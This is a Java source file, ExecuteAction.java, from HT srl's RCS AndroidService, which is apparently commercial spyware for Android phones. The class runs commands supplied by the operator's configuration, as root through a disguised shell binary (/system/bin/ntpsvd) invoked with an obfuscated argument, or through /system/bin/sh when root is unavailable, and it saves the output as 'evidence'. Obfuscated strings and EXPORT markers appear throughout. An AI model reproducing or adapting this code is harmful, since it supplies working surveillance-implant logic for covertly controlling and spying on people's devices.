/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ExecuteAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.action;

import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.Trigger;
import com.android.dvci.auto.Cfg;
import com.android.dvci.capabilities.PackageInfo;
import com.android.dvci.conf.ConfAction;
import com.android.dvci.conf.Configuration;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.file.Directory;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StreamGobbler;
import com.android.mm.M;

// TODO: Aggiungere parse $dir$, verificare chmod
/**
 * The Class ExecuteAction.
 */
public class ExecuteAction extends SubActionSlow {
	private static final String TAG = "ExecuteAction";

	private String command;

	/**
	 * Instantiates a new execute action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public ExecuteAction(final ConfAction params) {
		super(params);
	}

	@Override
	protected boolean parse(final ConfAction params) {
		try {
			this.command = Directory.expandMacro(params.getString("command"));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse): " + this.command);
			}
		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");
			}

			return false;
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		ExecuteResult ret;

		if (this.command.length() == 0)
			return false;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + command);
		}

		if (Status.haveRoot()) {
			ret = Execute.executeRoot(this.command);
		} else {
			ret = Execute.execute(this.command);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute) exitCode: " + ret.exitCode);
			Check.log(TAG + " (execute) stdout: " + ret.getStdout());
		}

		ret.saveEvidence();

		return ret.exitCode == 0;
	}


	public static boolean executeRoot(String command) {
		// Proviamo ad eseguire il comando da root
		try {
			// a_0=/system/bin/ntpsvd
			// 35_0=qzx
			String cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command); // EXPORT
			ExecuteResult ret = Execute.execute(Directory.expandMacro(cmd));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (executeRoot) exitCode: " + ret.exitCode);
				Check.log(TAG + " (executeRoot) stdout: " + ret.getStdout());
			}

			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (root exec)");
			}
		}
		return false;
	}

	public static boolean executeGobbler(String command) {
		try {

			Runtime rt = Runtime.getRuntime();
			Process proc = rt.exec(command);

			// any error message?
			StreamGobbler errorGobbler = new StreamGobbler(proc.getErrorStream(), "ERR");

			// any output?
			StreamGobbler outputGobbler = new StreamGobbler(proc.getInputStream(), "OUT");

			// kick them off
			errorGobbler.start();
			outputGobbler.start();

			// any error???
			int exitVal = proc.waitFor();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (executeOutput): ExitValue: " + exitVal);
			}
		} catch (Throwable t) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (executeOutput) Error: " + t);
			}
			return false;
		}
		return true;
	}

	// TODO: execute executionLine, saving output COMMAND
	// http://www.javaworld.com/javaworld/jw-12-2000/jw-1229-traps.html?page=4
	public static boolean executeOrigin(String command) {
		// Proviamo ad eseguire il comando da root
		try {
			String cmd[] = { Configuration.shellFile, M.e("qzx"), command }; // EXPORT
			Process p = Runtime.getRuntime().exec(cmd);

			p.waitFor();
			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (root exec)");
			}
		}

		// Proviamo ad eseguire il comando da utente normale
		try {
			String cmd[] = { M.e("/system/bin/sh"), M.e("-c"), command }; // EXPORT
			Process p = Runtime.getRuntime().exec(cmd);

			p.waitFor();
			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);
				Check.log(TAG + " (parse): Exception on parse() (non-root exec)");
			}
		}

		return false;
	}
}
